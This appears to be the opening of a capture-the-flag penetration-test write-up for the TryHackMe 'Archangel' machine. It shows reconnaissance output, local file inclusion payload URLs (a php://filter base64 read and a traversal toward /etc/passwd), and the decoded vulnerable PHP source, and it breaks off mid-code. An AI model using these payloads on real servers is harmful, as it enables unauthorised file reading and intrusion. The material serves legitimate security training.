bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c71{padding-top:0pt;padding-bottom:3pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c53{color:#936ec1;text-decoration:none;vertical-align:baseline;font-size:12.5pt;font-style:normal}.c77{color:#980000;text-decoration:none;vertical-align:baseline;font-size:42pt;font-style:normal}.c62{color:#000000;text-decoration:none;vertical-align:baseline;font-size:13pt;font-style:normal}.c23{color:#4a86e8;text-decoration:none;vertical-align:baseline;font-size:19pt;font-style:normal}.c28{color:#073763;text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.c37{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c13{color:#000000;text-decoration:none;vertical-align:baseline;font-size:10pt;font-style:normal}.c27{color:#516d7b;text-decoration:none;vertical-align:baseline;font-size:14pt;font-style:normal}.c38{color:#0b5394;text-decoration:none;vertical-align:baseline;font-size:18pt;font-style:normal}.c43{text-decoration-skip-ink:none;font-size:10pt;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c16{color:#333333;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c34{color:#000000;text-decoration:none;vertical-align:baseline;font-size:18pt;font-style:normal}.c60{color:#000000;text-decoration:none;vertical-align:baseline;font-size:12pt;font-style:normal}.c4{border-spacing:0;border-collapse:collapse;margin-right:auto}.c68{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c1{background-color:#22221b;font-family:"Consolas";color:#929181;font-weight:400}.c21{background-color:#22221b;font-family:"Consolas";color:#878573;font-weight:400}.c54{-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline;text-decoration-skip-ink:none}.c47{color:#22221b;text-decoration:none;vertical-align:baseline;font-style:normal}.c9{background-color:#22221b;font-family:"Consolas";color:#5f9182;font-weight:400}.c7{background-color:#22221b;font-family:"Consolas";color:#ae7313;font-weight:400}.c65{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.c19{background-color:#22221b;font-family:"Consolas";color:#ba6236;font-weight:400}.c3{background-color:#22221b;font-family:"Consolas";color:#7d9726;font-weight:400}.c61{color:#666666;text-decoration:none;vertical-align:baseline;font-style:italic}.c58{color:#4a86e8;text-decoration:none;vertical-align:baseline;font-style:normal}.c12{padding-top:0pt;padding-bottom:0pt;line-height:1.15;text-align:left}.c41{padding-top:0pt;padding-bottom:0pt;line-height:0.6;text-align:left}.c52{color:#000000;text-decoration:none;vertical-align:baseline;font-style:italic}.c66{text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c48{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c70{font-style:normal;color:#333333;text-decoration:none}.c74{background-color:#22221b;font-family:"Consolas";color:#36a166}.c76{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c59{width:33%;height:1px}.c56{font-size:9pt;color:#4a86e8}.c18{color:inherit;text-decoration:inherit}.c20{margin-left:36pt;padding-left:0pt}.c42{color:#000000;font-size:18pt}.c25{margin-left:72pt;padding-left:0pt}.c14{font-weight:400;font-family:"Arial"}.c11{font-weight:400;font-family:"Roboto Mono"}.c33{padding:0;margin:0}.c31{font-size:18pt;color:#22221b}.c36{height:0pt}.c72{text-indent:27pt}.c46{font-size:16pt}.c64{font-size:14pt}.c69{font-weight:400}.c57{page-break-after:avoid}.c10{margin-left:27pt}.c30{font-family:"Roboto Mono"}.c24{font-weight:700}.c73{margin-left:72pt}.c55{font-size:18pt}.c8{height:11pt}.c44{font-size:10pt}.title{padding-top:10pt;color:#980000;font-size:42pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:center}.subtitle{padding-top:6pt;color:#666666;font-size:13pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.3;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:center}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#0b5394;font-size:16pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:20pt;color:#073763;font-size:16pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:20pt;color:#516d7b;font-size:14pt;padding-bottom:3pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:8pt;color:#936ec1;font-size:12.5pt;padding-bottom:2pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:2pt;color:#6aa84f;font-size:12pt;padding-bottom:0pt;font-family:"Roboto Mono";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c76"><div><p class="c5 c8"><span class="c0"></span></p></div><p class="c63 title" id="h.nj23sjpj5u97"><span>Archangel</span></p><p class="c26 subtitle" id="h.dw2dac9r7xzm"><span class="c64">A report on the exploitation of a vulnerable web server.</span></p><p class="c48 c73"><span class="c11 c56">&nbsp; &nbsp;</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 345.92px; height: 358.88px;"><img alt="" src="images/image8.png" style="width: 345.92px; height: 358.88px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c65"><span class="c11 c31">0xd4y</span></p><p class="c65"><span class="c11 c46">April</span><span class="c11 c46 c68">&nbsp;30, 2021</span></p><p class="c5 c8"><span class="c14 c62"></span></p><p class="c71"><span class="c11 c46 c47">0xd4y Writeups</span></p><p class="c5"><span class="c30 c24">LinkedIn: </span><span class="c54 c11"><a class="c18" href="https://www.google.com/url?q=https://www.linkedin.com/in/segev-eliezer/&amp;sa=D&amp;source=editors&amp;ust=1653795832240818&amp;usg=AOvVaw2IpIFJm61-7CrdpYJ1uw37">https://www.linkedin.com/in/segev-eliezer/</a></span><span class="c11 c60">&nbsp;</span></p><p class="c5"><span class="c30 c24">Email: </span><span class="c11 c54"><a class="c18" href="mailto:0xd4yWriteups@gmail.com">0xd4yWriteups@gmail.com</a></span></p><p class="c5"><span class="c30 c24">Web:</span><span class="c11">&nbsp;</span><span class="c54 c11"><a class="c18" href="https://www.google.com/url?q=https://0xd4y.github.io/Writeups/&amp;sa=D&amp;source=editors&amp;ust=1653795832241402&amp;usg=AOvVaw3RIJaDXx3t4KH5g9bRgjZO">https://0xd4y.github.io/</a></span><span class="c11">&nbsp;</span></p><p class="c26 c57 subtitle" id="h.uzriz95hwg4"><span class="c11 c46 c61">Table of Contents</span></p><p class="c15"><span class="c24 c30"><a class="c18" href="#h.294g4biierlp">Executive Summary</a></span><span class="c30 c24">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c30 c24"><a class="c18" href="#h.294g4biierlp">2</a></span></p><p class="c6"><span class="c37 c30 c24"><a class="c18" href="#h.1v4pnj65xmth">Attack Narrative</a></span><span class="c30 c24 c37">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c37 c30 c24"><a class="c18" href="#h.1v4pnj65xmth">3</a></span></p><p class="c39"><span class="c2"><a class="c18" href="#h.5u2vk3e7kgnj">Reconnaissance</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.5u2vk3e7kgnj">3</a></span></p><p class="c40"><span class="c2"><a class="c18" href="#h.wbbcinqjysb2">Port Enumeration</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.wbbcinqjysb2">3</a></span></p><p class="c39"><span class="c2"><a class="c18" href="#h.3ze1wupj2899">Exploiting the Web Server</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.3ze1wupj2899">4</a></span></p><p class="c40"><span class="c2"><a class="c18" href="#h.pdief5tmjeq4">Web Enumeration</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.pdief5tmjeq4">4</a></span></p><p class="c40"><span class="c2"><a class="c18" href="#h.9wuhc1aj58h7">Local File Inclusion</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.9wuhc1aj58h7">5</a></span></p><p class="c51"><span class="c2"><a class="c18" href="#h.qdzu2aalbf2">Log Poisoning</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.qdzu2aalbf2">8</a></span></p><p class="c39"><span class="c2"><a class="c18" href="#h.c8ig29aegdk6">Horizontal Privilege Escalation</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.c8ig29aegdk6">12</a></span></p><p class="c39"><span class="c2"><a class="c18" href="#h.86wwt9vgzi00">Root Privilege Escalation</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.86wwt9vgzi00">13</a></span></p><p class="c40"><span class="c2"><a class="c18" href="#h.pue60l7cthuj">Binary Exploitation</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.pue60l7cthuj">14</a></span></p><p class="c51"><span class="c2"><a class="c18" href="#h.6tkff53mhtz6">Reverse Engineering</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.6tkff53mhtz6">14</a></span></p><p class="c51"><span class="c2"><a class="c18" href="#h.sawpdgpmtqpi">Command Injection</a></span><span class="c2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c2"><a class="c18" href="#h.sawpdgpmtqpi">14</a></span></p><p class="c50"><span class="c37 c30 c24"><a class="c18" href="#h.gs1ewfmvc73g">Conclusion</a></span><span class="c37 c30 c24">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c37 c30 c24"><a class="c18" href="#h.gs1ewfmvc73g">16</a></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><h1 class="c45" id="h.294g4biierlp"><span class="c11 c34">Executive Summary</span></h1><p class="c5 c8"><span class="c0"></span></p><p class="c5"><span>The attack performed on the target as outlined in this report was conducted without prior knowledge of anything about the client&rsquo;s machine except for its IP address. This was done so as to mimic a real attack from a person of malicious intent. The client&rsquo;s system contained multiple vulnerabilities ranging from local file inclusion to misconfigurations and an insecure SETUID binary. This machine was successfully compromised by exploiting an insecure PHP script to get a reverse shell as a low-privileged user, after which we were able to horizontally escalate privileges to a user on the system who had access to a vulnerable SETUID running as root. After the exploitation of this binary, we were able to successfully gain full privileges as root on the Archangel system. The client is highly encouraged to patch the system with the remediations outlined in the </span><span class="c54"><a class="c18" href="#h.gs1ewfmvc73g">Conclusion</a></span><span>&nbsp;</span><span>section</span><span>.</span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><h1 class="c45" id="h.1v4pnj65xmth"><span class="c42 c69">Attack Narrative</span></h1><p class="c5 c8"><span class="c0"></span></p><p class="c5"><span class="c0">We are given the IP of the target machine. The first step to finding any vulnerability is always reconnaissance.</span></p><h2 class="c49" id="h.5u2vk3e7kgnj"><span class="c28 c11">Reconnaissance</span></h2><p class="c5"><span>Before performing any kind of enumeration, it is essential to start with port enumeration. This will allow us to find possible attack vectors.</span></p><h3 class="c49" id="h.wbbcinqjysb2"><span class="c27 c11">Port Enumeration</span></h3><p class="c5"><span>We can enumerate the ports of the machine with </span><span class="c24">nmap -sC </span><span>(default scripts) </span><span class="c24">-sV </span><span>(version detection)</span><span class="c24">.</span></p><a id="t.7ef953b007406eff0bc66c7ec62d4adaa627e9a1"></a><a id="t.0"></a><table class="c4"><tr class="c36"><td class="c67" colspan="1" rowspan="1"><p class="c12"><span class="c16 c14"># Nmap 7.91 scan initiated Sat May &nbsp;1 01:38:36 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.72.16</span></p><p class="c12"><span class="c16 c14">Nmap scan report for archangel.thm (10.10.72.16)</span></p><p class="c12"><span class="c16 c14">Host is up (0.24s latency).</span></p><p class="c12"><span class="c16 c14">Not shown: 998 closed ports</span></p><p class="c12"><span class="c16 c14">PORT &nbsp; STATE SERVICE VERSION</span></p><p class="c12"><span class="c16 c14">22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span></p><p class="c12"><span class="c16 c14">| ssh-hostkey: </span></p><p class="c12"><span class="c16 c14">| &nbsp; 2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)</span></p><p class="c12"><span class="c16 c14">| &nbsp; 256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)</span></p><p class="c12"><span class="c16 c14">|_ &nbsp;256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)</span></p><p class="c12"><span class="c16 c14">80/tcp open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.29 ((Ubuntu))</span></p><p class="c12"><span class="c16 c14">|_http-server-header: Apache/2.4.29 (Ubuntu)</span></p><p class="c12"><span class="c16 c14">|_http-title: Wavefire</span></p><p class="c12"><span class="c70 c69">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span class="c0">The nmap scan only detected two open ports (ssh on port 22 and http on port 80). Both services are up to date, so there are no CVEs (Common Vulnerabilities and Exposures) associated with them. </span></p><h2 class="c49" id="h.3ze1wupj2899"><span>Exploiting the Web Server</span></h2><h3 class="c49" id="h.pdief5tmjeq4"><span class="c11 c27">Web Enumeration</span></h3><p class="c5"><span class="c0">Seeing as http is open, we can visit the website to find potential vulnerabilities.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 342.67px;"><img alt="" src="images/image1.png" style="width: 624.00px; height: 342.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span class="c0">After browsing around the web page and running a gobuster scan on it, nothing interesting came into view. However, in the front page of the website is an email:</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 207.00px; height: 46.00px;"><img alt="" src="images/image2.png" style="width: 207.00px; height: 46.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span>Most notably, we can see the domain of the email as </span><span class="c24">mafialive.thm</span><span>. Adding this domain to our </span><span class="c24">/etc/hosts</span><span class="c0">&nbsp;file and visiting the website at mafialive.thm, we are met with the following webpage:</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 451.00px; height: 137.00px;"><img alt="" src="images/image5.png" style="width: 451.00px; height: 137.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span class="c0">The website seems to be a simple HTTP server. There may be some interesting files / directories that can be revealed using a gobuster scan. </span></p><a id="t.d18bb500ab8e6d7ae13b77c26cb5d360fe88a92c"></a><a id="t.1"></a><table class="c4"><tr class="c36"><td class="c67" colspan="1" rowspan="1"><p class="c12"><span class="c16 c14">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/tryhackme/easy/linux/archangel/lfi]</span></p><p class="c12"><span class="c16 c14">&#9492;&#9472;&#9472;&#9596; $gobuster dir -u http://mafialive.thm -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php</span></p><p class="c12"><span class="c14 c16">===============================================================</span></p><p class="c12"><span class="c16 c14">Gobuster v3.0.1</span></p><p class="c12"><span class="c16 c14">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span></p><p class="c12"><span class="c16 c14">===============================================================</span></p><p class="c12"><span class="c16 c14">[+] Url: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;http://mafialive.thm</span></p><p class="c12"><span class="c16 c14">[+] Threads: &nbsp; &nbsp; &nbsp; &nbsp;10</span></p><p class="c12"><span class="c16 c14">[+] Wordlist: &nbsp; &nbsp; &nbsp; /opt/SecLists/Discovery/Web-Content/raft-small-words.txt</span></p><p class="c12"><span class="c16 c14">[+] Status codes: &nbsp; 200,204,301,302,307,401,403</span></p><p class="c12"><span class="c16 c14">[+] User Agent: &nbsp; &nbsp; gobuster/3.0.1</span></p><p class="c12"><span class="c16 c14">[+] Extensions: &nbsp; &nbsp; php</span></p><p class="c12"><span class="c16 c14">[+] Timeout: &nbsp; &nbsp; &nbsp; &nbsp;10s</span></p><p class="c12"><span class="c16 c14">===============================================================</span></p><p class="c12"><span class="c16 c14">2021/05/02 04:34:46 Starting gobuster</span></p><p class="c12"><span class="c16 c14">===============================================================</span></p><p class="c12"><span class="c16 c14">/.php (Status: 403)</span></p><p class="c12"><span class="c16 c14">/.html (Status: 403)</span></p><p class="c12"><span class="c16 c14">/.html.php (Status: 403)</span></p><p class="c12"><span class="c16 c14">/.htm (Status: 403)</span></p><p class="c12"><span class="c16 c14">/.htm.php (Status: 403)</span></p><p class="c12"><span class="c69 c70">/test.php (Status: 200)</span></p></td></tr></table><p class="c8 c35"><span class="c0"></span></p><p class="c5"><span>The scan found an interesting file by the name of </span><span class="c24">test.php</span><span class="c0">. Visiting this PHP file and clicking on the button, we are met with the following webpage:</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 124.00px;"><img alt="" src="images/image9.png" style="width: 624.00px; height: 124.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span>We can see that there is a view parameter in the URL with the full path of a PHP file called </span><span class="c24">mrrobot.php</span><span class="c0">. This full path is a hint that there may be an LFI (Local File Inclusion) vulnerability within the test.php script. </span></p><h3 class="c49" id="h.9wuhc1aj58h7"><span class="c27 c11">Local File Inclusion</span></h3><p class="c5"><span>We can verify this by seeing if we can convert the PHP file to base64 in order to read its source code. Using the PHP base64 filter on the </span><span class="c24">mrrobot.php</span><span class="c0">&nbsp;file, we can see the following output:</span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5"><span class="c13 c11">URL:</span></p><p class="c5 c10"><span class="c11 c13">http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php</span></p><p class="c5"><span class="c11 c44">Output:</span></p><p class="c5 c10"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 564.50px; height: 93.00px;"><img alt="" src="images/image3.png" style="width: 564.50px; height: 93.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span class="c0">Expectedly, the output of this URL is a base64 string relating to the source code of the mrrobot.php file. Decoding this string we see the following:</span></p><a id="t.3168ebfc00818b55a67977463d3c487d1d0970f8"></a><a id="t.2"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">&#9484;&#9472;[</span><span class="c7">0xd4</span><span class="c1">y@Writeup]&#9472;[~/business/tryhackme/easy/linux/archangel]<br>&#9492;&#9472;&#9472;&#9596; $echo -n </span><span class="c3">&quot;PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==&quot;</span><span class="c1">&nbsp;|base64 -d<br></span><span class="c7">&lt;?php</span><span class="c1">&nbsp;</span><span class="c9">echo</span><span class="c1">&nbsp;</span><span class="c3">&#39;Control is an illusion&#39;</span><span class="c1">; </span><span class="c7">?&gt;</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span>Although we were able to verify the LFI vulnerability by converting the mrrobot.php file into base64, we were unsuccessful in including </span><span class="c24">/etc/passwd</span><span class="c0">&nbsp;(even though it is a globally-readable file by default).</span></p><p class="c5"><span class="c13 c11">URL:</span></p><p class="c5 c10"><span class="c11 c44">http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php/../../../../../../../etc/passwd</span></p><p class="c5"><span class="c13 c11">Output:</span></p><p class="c5 c72"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 105.33px;"><img alt="" src="images/image7.png" style="width: 624.00px; height: 105.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span>The webpage provides an error message that says &ldquo;Sorry, Thats not allowed&rdquo;. Judging by this error message and the unsuccessful attempt at including the targeted file, we can conclude that there is a filter inside the test.php script that is detecting attempts at including local files. Implementing the same methodology that we used to read the source code for the mrrobot.php file, we can view the source code of the test.php file.</span></p><a id="t.5c616889219478a5922c31efc5d600629586b9ed"></a><a id="t.3"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">&#9484;&#9472;[&#10007;]&#9472;[</span><span class="c7">0xd4</span><span class="c1">y</span><span class="c3">@Writeup]</span><span class="c1">&#9472;[~/business/tryhackme/easy/linux/archangel]<br>&#9492;&#9472;&#9472;&#9596; $echo -n </span><span class="c3">&quot;CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygk<br>c3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyK<br>CRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYX<br>RzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==&quot;</span><span class="c1">|base64 -d &gt; test.php</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span class="c0">After decoding the base64 data, we are met with the contents of the test.php file&rsquo;s source code:</span></p><a id="t.d9d1f74a1c939b2e28d0e0c773ac791760131ea9"></a><a id="t.4"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c7">&lt;!DOCTYPE HTML&gt;</span><span class="c1"><br></span><span class="c19">&lt;html&gt;</span><span class="c1"><br><br></span><span class="c19">&lt;head&gt;</span><span class="c1"><br> &nbsp; &nbsp;</span><span class="c19">&lt;title&gt;</span><span class="c1">INCLUDE</span><span class="c19">&lt;/title&gt;</span><span class="c1"><br> &nbsp; &nbsp;</span><span class="c19">&lt;h1&gt;</span><span class="c1">Test Page. Not to be Deployed</span><span class="c19">&lt;/h1&gt;</span><span class="c1"><br> <br> &nbsp; &nbsp;</span><span class="c19">&lt;/button&gt;&lt;/a&gt;</span><span class="c1">&nbsp;</span><span class="c19">&lt;a href=</span><span class="c3">&quot;/test.php?view=/var/www/html/development_testing/mrrobot.php&quot;</span><span class="c19">&gt;&lt;button id=</span><span class="c3">&quot;secret&quot;</span><span class="c19">&gt;</span><span class="c1">Here is a button</span><span class="c19">&lt;/button&gt;&lt;/a&gt;&lt;br&gt;</span><span class="c1"><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c7">&lt;?php</span><span class="c1"><br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;</span><span class="c21">//FLAG: thm{explo1t1ng_lf1}</span><span class="c1"><br><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c9">function</span><span class="c1">&nbsp;</span><span class="c69 c74">containsStr</span><span class="c7">($str, $substr)</span><span class="c1">&nbsp;{<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c9">return</span><span class="c1">&nbsp;strpos($str, $substr) !== </span><span class="c9">false</span><span class="c1">;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;</span><span class="c9">if</span><span class="c1">(</span><span class="c9">isset</span><span class="c1">($_GET[</span><span class="c3">&quot;view&quot;</span><span class="c1">])){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;</span><span class="c9">if</span><span class="c1">(!containsStr($_GET[</span><span class="c3">&#39;view&#39;</span><span class="c1">], </span><span class="c3">&#39;../..&#39;</span><span class="c1">) &amp;&amp; containsStr($_GET[</span><span class="c3">&#39;view&#39;</span><span class="c1">], </span><span class="c3">&#39;/var/www/html/development_testing&#39;</span><span class="c1">)) {<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9">include</span><span 